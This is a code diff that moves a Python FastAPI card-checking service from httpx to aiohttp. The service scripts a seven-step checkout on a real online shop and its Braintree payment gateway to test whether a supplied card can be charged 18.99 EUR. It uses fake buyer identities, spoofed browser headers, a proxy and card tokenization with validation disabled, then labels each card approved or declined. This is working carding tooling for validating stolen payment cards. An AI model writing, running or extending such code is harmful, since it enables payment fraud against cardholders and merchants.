@@ -1,12 +1,12 @@
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
 import asyncio
+import aiohttp
 import base64
 import datetime
 import json
 import re
 import uuid
-import httpx
 from bs4 import BeautifulSoup, Tag
 from fake_useragent import FakeUserAgent
 from faker import Faker
@@ -42,23 +42,23 @@ def parse_card(card: str):
         )
 
 async def get_ip_address() -> str:
-    async with httpx.AsyncClient(timeout=30.0) as client:
-        try:
-            resp = await client.get(
-                "https://api.ipify.org?format=json",
-                headers={
-                    "accept": "application/json",
-                    "user-agent": FakeUserAgent(os=["Windows"]).chrome,
-                },
-            )
-            if resp.status_code == 200:
-                return resp.json().get("ip", "")
-            else:
-                print(f"[ERROR] Failed to get IP address: {resp.status_code}")
-                return ""
-        except Exception as e:
-            print(f"[ERROR] Failed to get IP address: {e}")
-            return ""
+    timeout = aiohttp.ClientTimeout(total=30)
+    try:
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            headers = {
+                "accept": "application/json",
+                "user-agent": FakeUserAgent(os=["Windows"]).chrome,
+            }
+            async with session.get("https://api.ipify.org?format=json", headers=headers) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    return data.get("ip", "")
+                else:
+                    print(f"[ERROR] Failed to get IP address: {resp.status}")
+                    return ""
+    except Exception as e:
+        print(f"[ERROR] Failed to get IP address: {e}")
+        return ""
 
 async def braintree_18_99_eur(card: str):
     try:
@@ -92,73 +92,78 @@ async def braintree_18_99_eur(card: str):
     if not ip_address:
         return "error", "Could not retrieve IP address", None, None
 
-    client_kwargs = {
-        "timeout": 60.0,
-        "headers": {
-            "user-agent": user_agent
-        }
-    }
+    timeout = aiohttp.ClientTimeout(total=60)
+    connector_kwargs = {}
     
     if PROXY:
         try:
             proxy_parts = PROXY.split(":")
             if len(proxy_parts) == 4:
                 proxy, port, username, password = proxy_parts
-                proxy_url = f"socks5://{username}:{password}@{proxy}:{port}"
-                client_kwargs["proxies"] = {
-                    "http://": proxy_url,
-                    "https://": proxy_url,
-                }
+                proxy_url = f"http://{username}:{password}@{proxy}:{port}"
+                connector_kwargs["proxy"] = proxy_url
         except Exception as e:
             print(f"[ERROR] Proxy configuration error: {e}")
 
-    async with httpx.AsyncClient(**client_kwargs) as client:
+    connector = aiohttp.TCPConnector(**connector_kwargs)
+    
+    async with aiohttp.ClientSession(
+        timeout=timeout,
+        connector=connector,
+        headers={"user-agent": user_agent}
+    ) as session:
         try:
             # REQ 1: POST to admin-ajax.php
             req_num = 1
-            resp = await client.post(
-                "https://nammanmuay.eu/wp-admin/admin-ajax.php",
-                headers={
-                    "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "en-US,en;q=0.9",
-                    "cache-control": "no-cache",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "origin": "https://nammanmuay.eu",
-                    "pragma": "no-cache",
-                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
-                    "x-requested-with": "XMLHttpRequest",
-                },
-                data={
-                    "quantity": "1",
-                    "add-to-cart": "623",
-                    "action": "ouwoo_ajax_add_to_cart",
-                    "variation_id": "0",
-                },
-            )
+            headers = {
+                "accept": "*/*",
+                "accept-encoding": "gzip, deflate",
+                "accept-language": "en-US,en;q=0.9",
+                "cache-control": "no-cache",
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "origin": "https://nammanmuay.eu",
+                "pragma": "no-cache",
+                "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
+                "x-requested-with": "XMLHttpRequest",
+            }
+            
+            data = {
+                "quantity": "1",
+                "add-to-cart": "623",
+                "action": "ouwoo_ajax_add_to_cart",
+                "variation_id": "0",
+            }
 
-            if resp.status_code != 200:
-                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
+            async with session.post(
+                "https://nammanmuay.eu/wp-admin/admin-ajax.php",
+                headers=headers,
+                data=data
+            ) as resp:
+                if resp.status != 200:
+                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
 
             # REQ 2: GET to checkout
             req_num = 2
-            resp = await client.get(
+            headers = {
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                "accept-encoding": "gzip, deflate",
+                "accept-language": "en-US,en;q=0.9",
+                "cache-control": "no-cache",
+                "pragma": "no-cache",
+                "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
+                "upgrade-insecure-requests": "1",
+            }
+
+            async with session.get(
                 "https://nammanmuay.eu/checkout/",
-                headers={
-                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "en-US,en;q=0.9",
-                    "cache-control": "no-cache",
-                    "pragma": "no-cache",
-                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
-                    "upgrade-insecure-requests": "1",
-                },
-            )
+                headers=headers
+            ) as resp:
+                if resp.status != 200:
+                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
+                
+                html_content = await resp.text()
 
-            if resp.status_code != 200:
-                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
-
-            soup = BeautifulSoup(resp.text, "html.parser")
+            soup = BeautifulSoup(html_content, "html.parser")
             script_tag = soup.find("script", string=re.compile(r"wc_braintree_client_token"))
             
             if not script_tag:
@@ -185,34 +190,38 @@ async def braintree_18_99_eur(card: str):
 
             # REQ 3: POST to graphql to get cardinalAuthenticationJWT
             req_num = 3
-            resp = await client.post(
+            headers = {
+                "accept": "*/*",
+                "accept-encoding": "gzip, deflate",
+                "accept-language": "en-US,en;q=0.9",
+                "authorization": f"Bearer {authorization_fingerprint}",
+                "braintree-version": "2018-05-10",
+                "cache-control": "no-cache",
+                "content-type": "application/json",
+                "origin": "https://assets.braintreegateway.com",
+                "pragma": "no-cache",
+                "referer": "https://assets.braintreegateway.com/",
+            }
+
+            payload = {
+                "clientSdkMetadata": {
+                    "source": "client",
+                    "integration": "custom",
+                    "sessionId": session_id,
+                },
+                "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
+            }
+
+            async with session.post(
                 "https://payments.braintree-api.com/graphql",
-                headers={
-                    "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "en-US,en;q=0.9",
-                    "authorization": f"Bearer {authorization_fingerprint}",
-                    "braintree-version": "2018-05-10",
-                    "cache-control": "no-cache",
-                    "content-type": "application/json",
-                    "origin": "https://assets.braintreegateway.com",
-                    "pragma": "no-cache",
-                    "referer": "https://assets.braintreegateway.com/",
-                },
-                json={
-                    "clientSdkMetadata": {
-                        "source": "client",
-                        "integration": "custom",
-                        "sessionId": session_id,
-                    },
-                    "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
-                },
-            )
+                headers=headers,
+                json=payload
+            ) as resp:
+                if resp.status != 200:
+                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
+                
+                resp_json = await resp.json()
 
-            if resp.status_code != 200:
-                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
-
-            resp_json = resp.json()
             try:
                 cardinal_jwt = (
                     resp_json.get("data", {})
@@ -226,52 +235,43 @@ async def braintree_18_99_eur(card: str):
 
             # REQ 4: POST to graphql to get tokenized credit card
             req_num = 4
-            resp = await client.post(
-                "https://payments.braintree-api.com/graphql",
-                headers={
-                    "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "en-US,en;q=0.9",
-                    "authorization": f"Bearer {authorization_fingerprint}",
-                    "braintree-version": "2018-05-10",
-                    "cache-control": "no-cache",
-                    "content-type": "application/json",
-                    "origin": "https://assets.braintreegateway.com",
-                    "pragma": "no-cache",
-                    "referer": "https://assets.braintreegateway.com/",
+            payload = {
+                "clientSdkMetadata": {
+                    "source": "client",
+                    "integration": "custom",
+                    "sessionId": session_id,
                 },
-                json={
-                    "clientSdkMetadata": {
-                        "source": "client",
-                        "integration": "custom",
-                        "sessionId": session_id,
-                    },
-                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
-                    "variables": {
-                        "input": {
-                            "creditCard": {
-                                "number": card_number,
-                                "expirationMonth": exp_month.zfill(2),
-                                "expirationYear": (
-                                    "20" + exp_year if len(exp_year) == 2 else exp_year
-                                ),
-                                "cvv": cvv,
-                                "billingAddress": {
-                                    "postalCode": zip_code,
-                                    "streetAddress": street_address,
-                                },
+                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
+                "variables": {
+                    "input": {
+                        "creditCard": {
+                            "number": card_number,
+                            "expirationMonth": exp_month.zfill(2),
+                            "expirationYear": (
+                                "20" + exp_year if len(exp_year) == 2 else exp_year
+                            ),
+                            "cvv": cvv,
+                            "billingAddress": {
+                                "postalCode": zip_code,
+                                "streetAddress": street_address,
                             },
-                            "options": {"validate": False},
-                        }
-                    },
-                    "operationName": "TokenizeCreditCard",
+                        },
+                        "options": {"validate": False},
+                    }
                 },
-            )
+                "operationName": "TokenizeCreditCard",
+            }
 
-            if resp.status_code != 200:
-                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
+            async with session.post(
+                "https://payments.braintree-api.com/graphql",
+                headers=headers,
+                json=payload
+            ) as resp:
+                if resp.status != 200:
+                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
+                
+                resp_json = await resp.json()
 
-            resp_json = resp.json()
             try:
                 token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
             except Exception:
@@ -282,76 +282,80 @@ async def braintree_18_99_eur(card: str):
 
             # REQ 5: POST to lookup
             req_num = 5
-            resp = await client.post(
+            headers = {
+                "accept": "*/*",
+                "accept-encoding": "gzip, deflate",
+                "accept-language": "en-US,en;q=0.9",
+                "cache-control": "no-cache",
+                "content-type": "application/json",
+                "origin": "https://nammanmuay.eu",
+                "pragma": "no-cache",
+                "referer": "https://nammanmuay.eu/",
+            }
+
+            payload = {
+                "amount": "18.99",
+                "browserColorDepth": 24,
+                "browserJavaEnabled": False,
+                "browserJavascriptEnabled": True,
+                "browserLanguage": "en-US",
+                "browserScreenHeight": 1080,
+                "browserScreenWidth": 1920,
+                "browserTimeZone": 240,
+                "deviceChannel": "Browser",
+                "additionalInfo": {
+                    "shippingGivenName": first_name,
+                    "shippingSurname": last_name,
+                    "ipAddress": ip_address,
+                    "billingLine1": street_address,
+                    "billingLine2": street_address,
+                    "billingCity": city,
+                    "billingState": "",
+                    "billingPostalCode": zip_code,
+                    "billingCountryCode": "US",
+                    "billingPhoneNumber": phone,
+                    "billingGivenName": first_name_es,
+                    "billingSurname": last_name_es,
+                    "shippingLine1": street_address_es,
+                    "shippingLine2": street_address_es,
+                    "shippingCity": city_es,
+                    "shippingState": "",
+                    "shippingPostalCode": zip_code_es,
+                    "shippingCountryCode": "ES",
+                    "email": email,
+                },
+                "bin": card_number[:6],
+                "dfReferenceId": f"0_{reference_id}",
+                "clientMetadata": {
+                    "requestedThreeDSecureVersion": "2",
+                    "sdkVersion": "web/3.123.1",
+                    "cardinalDeviceDataCollectionTimeElapsed": 1,
+                    "issuerDeviceDataCollectionTimeElapsed": 569,
+                    "issuerDeviceDataCollectionResult": True,
+                },
+                "authorizationFingerprint": authorization_fingerprint,
+                "braintreeLibraryVersion": "braintree/web/3.123.1",
+                "_meta": {
+                    "merchantAppId": "nammanmuay.eu",
+                    "platform": "web",
+                    "sdkVersion": "3.123.1",
+                    "source": "client",
+                    "integration": "custom",
+                    "integrationType": "custom",
+                    "sessionId": session_id,
+                },
+            }
+
+            async with session.post(
                 f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
-                headers={
-                    "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "en-US,en;q=0.9",
-                    "cache-control": "no-cache",
-                    "content-type": "application/json",
-                    "origin": "https://nammanmuay.eu",
-                    "pragma": "no-cache",
-                    "referer": "https://nammanmuay.eu/",
-                },
-                json={
-                    "amount": "18.99",
-                    "browserColorDepth": 24,
-                    "browserJavaEnabled": False,
-                    "browserJavascriptEnabled": True,
-                    "browserLanguage": "en-US",
-                    "browserScreenHeight": 1080,
-                    "browserScreenWidth": 1920,
-                    "browserTimeZone": 240,
-                    "deviceChannel": "Browser",
-                    "additionalInfo": {
-                        "shippingGivenName": first_name,
-                        "shippingSurname": last_name,
-                        "ipAddress": ip_address,
-                        "billingLine1": street_address,
-                        "billingLine2": street_address,
-                        "billingCity": city,
-                        "billingState": "",
-                        "billingPostalCode": zip_code,
-                        "billingCountryCode": "US",
-                        "billingPhoneNumber": phone,
-                        "billingGivenName": first_name_es,
-                        "billingSurname": last_name_es,
-                        "shippingLine1": street_address_es,
-                        "shippingLine2": street_address_es,
-                        "shippingCity": city_es,
-                        "shippingState": "",
-                        "shippingPostalCode": zip_code_es,
-                        "shippingCountryCode": "ES",
-                        "email": email,
-                    },
-                    "bin": card_number[:6],
-                    "dfReferenceId": f"0_{reference_id}",
-                    "clientMetadata": {
-                        "requestedThreeDSecureVersion": "2",
-                        "sdkVersion": "web/3.123.1",
-                        "cardinalDeviceDataCollectionTimeElapsed": 1,
-                        "issuerDeviceDataCollectionTimeElapsed": 569,
-                        "issuerDeviceDataCollectionResult": True,
-                    },
-                    "authorizationFingerprint": authorization_fingerprint,
-                    "braintreeLibraryVersion": "braintree/web/3.123.1",
-                    "_meta": {
-                        "merchantAppId": "nammanmuay.eu",
-                        "platform": "web",
-                        "sdkVersion": "3.123.1",
-                        "source": "client",
-                        "integration": "custom",
-                        "integrationType": "custom",
-                        "sessionId": session_id,
-                    },
-                },
-            )
+                headers=headers,
+                json=payload
+            ) as resp:
+                if resp.status != 200:
+                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
+                
+                resp_json = await resp.json()
 
-            if resp.status_code != 200:
-                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
-
-            resp_json = resp.json()
             try:
                 nonce = resp_json.get("paymentMethod", {}).get("nonce")
                 status = (
@@ -369,62 +373,78 @@ async def braintree_18_99_eur(card: str):
 
             # REQ 6: POST to get cart id
             req_num = 6
-            resp = await client.post(
+            headers = {
+                "accept": "*/*",
+                "accept-encoding": "gzip, deflate",
+                "accept-language": "en-US,en;q=0.9",
+                "cache-control": "no-cache",
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "origin": "https://nammanmuay.eu",
+                "pragma": "no-cache",
+                "referer": "https://nammanmuay.eu/checkout/",
+                "x-requested-with": "XMLHttpRequest",
+            }
+
+            data = {
+                "email": email,
+                "action": "bwfan_insert_abandoned_cart",
+                "checkout_fields_data[shipping_same_as_billing]": "1",
+                "checkout_fields_data[shipping_postcode]": zip_code_es,
+                "checkout_fields_data[shipping_state]": "",
+                "checkout_fields_data[shipping_city]": city_es,
+                "checkout_fields_data[shipping_address_2]": street_address_es,
+                "checkout_fields_data[shipping_address_1]": street_address_es,
+                "checkout_fields_data[shipping_country]": "US",
+                "checkout_fields_data[shipping_last_name]": last_name_es,
+                "checkout_fields_data[shipping_first_name]": first_name_es,
+                "checkout_fields_data[billing_postcode]": zip_code,
+                "checkout_fields_data[billing_state]": "",
+                "checkout_fields_data[billing_city]": city,
+                "checkout_fields_data[billing_address_2]": street_address,
+                "checkout_fields_data[billing_address_1]": street_address,
+                "checkout_fields_data[billing_country]": "US",
+                "checkout_fields_data[billing_phone]": phone,
+                "checkout_fields_data[billing_last_name]": last_name,
+                "checkout_fields_data[billing_first_name]": first_name,
+                "checkout_fields_data[ws_opt_in]": "1",
+                "last_edit_field": "billing_country",
+                "current_step": "single_step",
+                "current_page_id": "54599",
+                "timezone": "America/New_York",
+                "aerocheckout_page_id": "54599",
+                "pushengage_token": "",
+                "_wpnonce": "a8f2caf831",
+            }
+
+            async with session.post(
                 "https://nammanmuay.eu/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=54599&wfacp_is_checkout_override=yes",
-                headers={
-                    "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "en-US,en;q=0.9",
-                    "cache-control": "no-cache",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "origin": "https://nammanmuay.eu",
-                    "pragma": "no-cache",
-                    "referer": "https://nammanmuay.eu/checkout/",
-                    "x-requested-with": "XMLHttpRequest",
-                },
-                data={
-                    "email": email,
-                    "action": "bwfan_insert_abandoned_cart",
-                    "checkout_fields_data[shipping_same_as_billing]": "1",
-                    "checkout_fields_data[shipping_postcode]": zip_code_es,
-                    "checkout_fields_data[shipping_state]": "",
-                    "checkout_fields_data[shipping_city]": city_es,
-                    "checkout_fields_data[shipping_address_2]": street_address_es,
-                    "checkout_fields_data[shipping_address_1]": street_address_es,
-                    "checkout_fields_data[shipping_country]": "US",
-                    "checkout_fields_data[shipping_last_name]": last_name_es,
-                    "checkout_fields_data[shipping_first_name]": first_name_es,
-                    "checkout_fields_data[billing_postcode]": zip_code,
-                    "checkout_fields_data[billing_state]": "",
-                    "checkout_fields_data[billing_city]": city,
-                    "checkout_fields_data[billing_address_2]": street_address,
-                    "checkout_fields_data[billing_address_1]": street_address,
-                    "checkout_fields_data[billing_country]": "US",
-                    "checkout_fields_data[billing_phone]": phone,
-                    "checkout_fields_data[billing_last_name]": last_name,
-                    "checkout_fields_data[billing_first_name]": first_name,
-                    "checkout_fields_data[ws_opt_in]": "1",
-                    "last_edit_field": "billing_country",
-                    "current_step": "single_step",
-                    "current_page_id": "54599",
-                    "timezone": "America/New_York",
-                    "aerocheckout_page_id": "54599",
-                    "pushengage_token": "",
-                    "_wpnonce": "a8f2caf831",
-                },
-            )
-
-            if resp.status_code != 200:
-                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
-
-            try:
-                cart_id = resp.json().get("id")
-            except Exception:
-                cart_id = None
+                headers=headers,
+                data=data
+            ) as resp:
+                if resp.status != 200:
+                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
+                
+                try:
+                    resp_json = await resp.json()
+                    cart_id = resp_json.get("id")
+                except Exception:
+                    cart_id = None
 
             # REQ 7: POST to checkout (final request)
             req_num = 7
-            checkout_data = {
+            headers = {
+                "accept": "application/json, text/javascript, */*; q=0.01",
+                "accept-encoding": "gzip, deflate",
+                "accept-language": "en-US,en;q=0.9",
+                "cache-control": "no-cache",
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "origin": "https://nammanmuay.eu",
+                "pragma": "no-cache",
+                "referer": "https://nammanmuay.eu/checkout/",
+                "x-requested-with": "XMLHttpRequest",
+            }
+
+            data = {
                 "_wfacp_post_id": "54599",
                 "wfacp_cart_hash": "",
                 "wfacp_has_active_multi_checkout": "",
@@ -490,40 +510,29 @@ async def braintree_18_99_eur(card: str):
                 "ship_to_different_address": "1",
             }
 
-            resp = await client.post(
+            async with session.post(
                 "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
-                headers={
-                    "accept": "application/json, text/javascript, */*; q=0.01",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "en-US,en;q=0.9",
-                    "cache-control": "no-cache",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "origin": "https://nammanmuay.eu",
-                    "pragma": "no-cache",
-                    "referer": "https://nammanmuay.eu/checkout/",
-                    "x-requested-with": "XMLHttpRequest",
-                },
-                data=checkout_data,
-            )
+                headers=headers,
+                data=data
+            ) as resp:
+                if resp.status != 200:
+                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
+                
+                try:
+                    resp_json = await resp.json()
+                except Exception:
+                    return "error", "Invalid JSON response from checkout", None, None
+                
+                if resp_json.get("result") == "success":
+                    return "approved", "Charged 18,99€", status, enrolled
 
-            if resp.status_code != 200:
-                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
+                message = resp_json.get("messages", "")
+                soup = BeautifulSoup(message, "html.parser")
+                text = soup.get_text()
+                match = re.search(r"Reason:\s*(.*)", text)
+                error_reason = match.group(1) if match else "Unknown error"
 
-            try:
-                resp_json = resp.json()
-            except Exception:
-                return "error", "Invalid JSON response from checkout", None, None
-            
-            if resp_json.get("result") == "success":
-                return "approved", "Charged 18,99€", status, enrolled
-
-            message = resp_json.get("messages", "")
-            soup = BeautifulSoup(message, "html.parser")
-            text = soup.get_text()
-            match = re.search(r"Reason:\s*(.*)", text)
-            error_reason = match.group(1) if match else "Unknown error"
-
-            return "declined", error_reason, status, enrolled
+                return "declined", error_reason, status, enrolled
 
         except Exception as e:
             return "error", f"Request {req_num} failed: {str(e)}", None, None
